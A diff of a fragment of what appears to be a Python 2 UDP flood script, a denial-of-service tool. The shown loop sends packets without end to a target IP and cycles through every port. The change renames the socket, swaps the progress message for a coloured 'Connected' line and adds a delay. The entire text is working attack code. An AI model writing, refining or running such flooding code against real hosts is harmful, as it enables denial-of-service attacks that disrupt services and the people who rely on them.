@@ -26,9 +26,11 @@ print "[====================] 100%"
 time.sleep(3)
 sent = 0
 while True:
-      sock.sendto(bytes, (ip,port))
-      sent = sent + 1
-      port = port + 1
-      print "Sent %s packet to %s throught port:%s"%(sent,ip,port)
-      if port == 65534:
+     connect.sendto(bytes, (ip,port))
+     sent = sent + 1
+     port = port + 1
+     print "\033[0;31mConnected --> \033[0;32m%s"%(ip)
+     time.sleep(2)
+     if port == 65534:
        port = 1
+ 
